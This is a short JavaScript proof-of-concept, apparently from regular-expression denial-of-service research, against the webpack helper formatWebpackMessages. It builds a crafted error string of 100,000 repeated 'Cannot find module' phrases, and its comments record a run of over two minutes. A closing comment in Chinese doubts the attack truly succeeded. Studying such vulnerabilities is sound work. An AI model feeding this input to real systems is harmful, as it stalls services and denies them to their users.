const formatWebpackMessages = require("./formatWebpackMessages.js");

//Attack String :"\n"+"Cannot find module"*100000+"\u0000"
var str = "\n";
for (var i = 0; i < 100000; i++) {
  str += "Cannot find module";
}
str += "\u0000";

const json = {
  errors: ["", str],
  warnings: [],
};
var result = formatWebpackMessages(json);

// real    2m18.856s
// user    2m18.819s
// sys     0m0.020s

//为符合lines[1]的条件,修改了攻击串,是否真正成功仍存疑